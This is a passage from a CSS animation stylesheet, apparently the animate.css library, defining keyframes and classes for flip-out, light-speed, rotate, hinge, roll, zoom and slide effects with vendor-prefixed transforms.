    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1;
  }

  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0;
  }
}

.flipOutX {
  -webkit-animation-name: flipOutX;
  animation-name: flipOutX;
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
}

@-webkit-keyframes flipOutY {
  from {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }

  30% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
    opacity: 1;
  }

  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    opacity: 0;
  }
}

@keyframes flipOutY {
  from {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }

  30% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
    opacity: 1;
  }

  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    opacity: 0;
  }
}

.flipOutY {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipOutY;
  animation-name: flipOutY;
}

@-webkit-keyframes lightSpeedIn {
  from {
    -webkit-transform: translate3d(100%, 0, 0) skewX(-30deg);
    transform: translate3d(100%, 0, 0) skewX(-30deg);
    opacity: 0;
  }

  60% {
    -webkit-transform: skewX(20deg);
    transform: skewX(20deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: skewX(-5deg);
    transform: skewX(-5deg);
    opacity: 1;
  }

  to {
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes lightSpeedIn {
  from {
    -webkit-transform: translate3d(100%, 0, 0) skewX(-30deg);
    transform: translate3d(100%, 0, 0) skewX(-30deg);
    opacity: 0;
  }

  60% {
    -webkit-transform: skewX(20deg);
    transform: skewX(20deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: skewX(-5deg);
    transform: skewX(-5deg);
    opacity: 1;
  }

  to {
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.lightSpeedIn {
  -webkit-animation-name: lightSpeedIn;
  animation-name: lightSpeedIn;
  -webkit-animation-timing-function: ease-out;
  animation-timing-function: ease-out;
}

@-webkit-keyframes lightSpeedOut {
  from {
    opacity: 1;
  }

  to {
    -webkit-transform: translate3d(100%, 0, 0) skewX(30deg);
    transform: translate3d(100%, 0, 0) skewX(30deg);
    opacity: 0;
  }
}

@keyframes lightSpeedOut {
  from {
    opacity: 1;
  }

  to {
    -webkit-transform: translate3d(100%, 0, 0) skewX(30deg);
    transform: translate3d(100%, 0, 0) skewX(30deg);
    opacity: 0;
  }
}

.lightSpeedOut {
  -webkit-animation-name: lightSpeedOut;
  animation-name: lightSpeedOut;
  -webkit-animation-timing-function: ease-in;
  animation-timing-function: ease-in;
}

@-webkit-keyframes rotateIn {
  from {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: rotate3d(0, 0, 1, -200deg);
    transform: rotate3d(0, 0, 1, -200deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes rotateIn {
  from {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: rotate3d(0, 0, 1, -200deg);
    transform: rotate3d(0, 0, 1, -200deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.rotateIn {
  -webkit-animation-name: rotateIn;
  animation-name: rotateIn;
}

@-webkit-keyframes rotateInDownLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes rotateInDownLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.rotateInDownLeft {
  -webkit-animation-name: rotateInDownLeft;
  animation-name: rotateInDownLeft;
}

@-webkit-keyframes rotateInDownRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes rotateInDownRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.rotateInDownRight {
  -webkit-animation-name: rotateInDownRight;
  animation-name: rotateInDownRight;
}

@-webkit-keyframes rotateInUpLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes rotateInUpLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.rotateInUpLeft {
  -webkit-animation-name: rotateInUpLeft;
  animation-name: rotateInUpLeft;
}

@-webkit-keyframes rotateInUpRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, -90deg);
    transform: rotate3d(0, 0, 1, -90deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

@keyframes rotateInUpRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, -90deg);
    transform: rotate3d(0, 0, 1, -90deg);
    opacity: 0;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: none;
    transform: none;
    opacity: 1;
  }
}

.rotateInUpRight {
  -webkit-animation-name: rotateInUpRight;
  animation-name: rotateInUpRight;
}

@-webkit-keyframes rotateOut {
  from {
    -webkit-transform-origin: center;
    transform-origin: center;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: rotate3d(0, 0, 1, 200deg);
    transform: rotate3d(0, 0, 1, 200deg);
    opacity: 0;
  }
}

@keyframes rotateOut {
  from {
    -webkit-transform-origin: center;
    transform-origin: center;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: center;
    transform-origin: center;
    -webkit-transform: rotate3d(0, 0, 1, 200deg);
    transform: rotate3d(0, 0, 1, 200deg);
    opacity: 0;
  }
}

.rotateOut {
  -webkit-animation-name: rotateOut;
  animation-name: rotateOut;
}

@-webkit-keyframes rotateOutDownLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }
}

@keyframes rotateOutDownLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, 45deg);
    transform: rotate3d(0, 0, 1, 45deg);
    opacity: 0;
  }
}

.rotateOutDownLeft {
  -webkit-animation-name: rotateOutDownLeft;
  animation-name: rotateOutDownLeft;
}

@-webkit-keyframes rotateOutDownRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }
}

@keyframes rotateOutDownRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }
}

.rotateOutDownRight {
  -webkit-animation-name: rotateOutDownRight;
  animation-name: rotateOutDownRight;
}

@-webkit-keyframes rotateOutUpLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }
}

@keyframes rotateOutUpLeft {
  from {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: left bottom;
    transform-origin: left bottom;
    -webkit-transform: rotate3d(0, 0, 1, -45deg);
    transform: rotate3d(0, 0, 1, -45deg);
    opacity: 0;
  }
}

.rotateOutUpLeft {
  -webkit-animation-name: rotateOutUpLeft;
  animation-name: rotateOutUpLeft;
}

@-webkit-keyframes rotateOutUpRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, 90deg);
    transform: rotate3d(0, 0, 1, 90deg);
    opacity: 0;
  }
}

@keyframes rotateOutUpRight {
  from {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    opacity: 1;
  }

  to {
    -webkit-transform-origin: right bottom;
    transform-origin: right bottom;
    -webkit-transform: rotate3d(0, 0, 1, 90deg);
    transform: rotate3d(0, 0, 1, 90deg);
    opacity: 0;
  }
}

.rotateOutUpRight {
  -webkit-animation-name: rotateOutUpRight;
  animation-name: rotateOutUpRight;
}

@-webkit-keyframes hinge {
  0% {
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
  }

  20%, 60% {
    -webkit-transform: rotate3d(0, 0, 1, 80deg);
    transform: rotate3d(0, 0, 1, 80deg);
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
  }

  40%, 80% {
    -webkit-transform: rotate3d(0, 0, 1, 60deg);
    transform: rotate3d(0, 0, 1, 60deg);
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
    opacity: 1;
  }

  to {
    -webkit-transform: translate3d(0, 700px, 0);
    transform: translate3d(0, 700px, 0);
    opacity: 0;
  }
}

@keyframes hinge {
  0% {
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
  }

  20%, 60% {
    -webkit-transform: rotate3d(0, 0, 1, 80deg);
    transform: rotate3d(0, 0, 1, 80deg);
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
  }

  40%, 80% {
    -webkit-transform: rotate3d(0, 0, 1, 60deg);
    transform: rotate3d(0, 0, 1, 60deg);
    -webkit-transform-origin: top left;
    transform-origin: top left;
    -webkit-animation-timing-function: ease-in-out;
    animation-timing-function: ease-in-out;
    opacity: 1;
  }

  to {
    -webkit-transform: translate3d(0, 700px, 0);
    transform: translate3d(0, 700px, 0);
    opacity: 0;
  }
}

.hinge {
  -webkit-animation-name: hinge;
  animation-name: hinge;
}

/* originally authored by Nick Pettit - https://github.com/nickpettit/glide */

@-webkit-keyframes rollIn {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
    transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes rollIn {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
    transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.rollIn {
  -webkit-animation-name: rollIn;
  animation-name: rollIn;
}

/* originally authored by Nick Pettit - https://github.com/nickpettit/glide */

@-webkit-keyframes rollOut {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
    transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
  }
}

@keyframes rollOut {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
    transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
  }
}

.rollOut {
  -webkit-animation-name: rollOut;
  animation-name: rollOut;
}

@-webkit-keyframes zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  50% {
    opacity: 1;
  }
}

@keyframes zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  50% {
    opacity: 1;
  }
}

.zoomIn {
  -webkit-animation-name: zoomIn;
  animation-name: zoomIn;
}

@-webkit-keyframes zoomInDown {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, -1000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, -1000px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomInDown {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, -1000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, -1000px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomInDown {
  -webkit-animation-name: zoomInDown;
  animation-name: zoomInDown;
}

@-webkit-keyframes zoomInLeft {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(-1000px, 0, 0);
    transform: scale3d(.1, .1, .1) translate3d(-1000px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(10px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(10px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomInLeft {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(-1000px, 0, 0);
    transform: scale3d(.1, .1, .1) translate3d(-1000px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(10px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(10px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomInLeft {
  -webkit-animation-name: zoomInLeft;
  animation-name: zoomInLeft;
}

@-webkit-keyframes zoomInRight {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(1000px, 0, 0);
    transform: scale3d(.1, .1, .1) translate3d(1000px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(-10px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(-10px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomInRight {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(1000px, 0, 0);
    transform: scale3d(.1, .1, .1) translate3d(1000px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(-10px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(-10px, 0, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomInRight {
  -webkit-animation-name: zoomInRight;
  animation-name: zoomInRight;
}

@-webkit-keyframes zoomInUp {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, 1000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, 1000px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomInUp {
  from {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, 1000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, 1000px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomInUp {
  -webkit-animation-name: zoomInUp;
  animation-name: zoomInUp;
}

@-webkit-keyframes zoomOut {
  from {
    opacity: 1;
  }

  50% {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  to {
    opacity: 0;
  }
}

@keyframes zoomOut {
  from {
    opacity: 1;
  }

  50% {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  to {
    opacity: 0;
  }
}

.zoomOut {
  -webkit-animation-name: zoomOut;
  animation-name: zoomOut;
}

@-webkit-keyframes zoomOutDown {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, 2000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, 2000px, 0);
    -webkit-transform-origin: center bottom;
    transform-origin: center bottom;
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomOutDown {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, -60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, 2000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, 2000px, 0);
    -webkit-transform-origin: center bottom;
    transform-origin: center bottom;
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomOutDown {
  -webkit-animation-name: zoomOutDown;
  animation-name: zoomOutDown;
}

@-webkit-keyframes zoomOutLeft {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(42px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(42px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: scale(.1) translate3d(-2000px, 0, 0);
    transform: scale(.1) translate3d(-2000px, 0, 0);
    -webkit-transform-origin: left center;
    transform-origin: left center;
  }
}

@keyframes zoomOutLeft {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(42px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(42px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: scale(.1) translate3d(-2000px, 0, 0);
    transform: scale(.1) translate3d(-2000px, 0, 0);
    -webkit-transform-origin: left center;
    transform-origin: left center;
  }
}

.zoomOutLeft {
  -webkit-animation-name: zoomOutLeft;
  animation-name: zoomOutLeft;
}

@-webkit-keyframes zoomOutRight {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(-42px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(-42px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: scale(.1) translate3d(2000px, 0, 0);
    transform: scale(.1) translate3d(2000px, 0, 0);
    -webkit-transform-origin: right center;
    transform-origin: right center;
  }
}

@keyframes zoomOutRight {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(-42px, 0, 0);
    transform: scale3d(.475, .475, .475) translate3d(-42px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: scale(.1) translate3d(2000px, 0, 0);
    transform: scale(.1) translate3d(2000px, 0, 0);
    -webkit-transform-origin: right center;
    transform-origin: right center;
  }
}

.zoomOutRight {
  -webkit-animation-name: zoomOutRight;
  animation-name: zoomOutRight;
}

@-webkit-keyframes zoomOutUp {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, -2000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, -2000px, 0);
    -webkit-transform-origin: center bottom;
    transform-origin: center bottom;
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

@keyframes zoomOutUp {
  40% {
    opacity: 1;
    -webkit-transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    transform: scale3d(.475, .475, .475) translate3d(0, 60px, 0);
    -webkit-animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
    animation-timing-function: cubic-bezier(0.550, 0.055, 0.675, 0.190);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.1, .1, .1) translate3d(0, -2000px, 0);
    transform: scale3d(.1, .1, .1) translate3d(0, -2000px, 0);
    -webkit-transform-origin: center bottom;
    transform-origin: center bottom;
    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
    animation-timing-function: cubic-bezier(0.175, 0.885, 0.320, 1);
  }
}

.zoomOutUp {
  -webkit-animation-name: zoomOutUp;
  animation-name: zoomOutUp;
}

@-webkit-keyframes slideInDown {
  from {
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInDown {
  from {
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInDown {
  -webkit-animation-name: slideInDown;
  animation-name: slideInDown;
}

@-webkit-keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInLeft {
  -webkit-animation-name: slideInLeft;
  animation-name: slideInLeft;
}

@-webkit-keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInRight {
  -webkit-animation-name: slideInRight;
  animation-name: slideInRight;
}

@-webkit-keyframes slideInUp {
  from {
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInUp {
  from {
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInUp {
  -webkit-animation-name: slideInUp;
  animation-name: slideInUp;
}

@-webkit-keyframes slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }
}

@keyframes slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }
}

.slideOutDown {
  -webkit-animation-name: slideOutDown;
  animation-name: slideOutDown;
}

@-webkit-keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

@keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

.slideOutLeft {
  -webkit-animation-name: slideOutLeft;
  animation-name: slideOutLeft;
}

@-webkit-keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
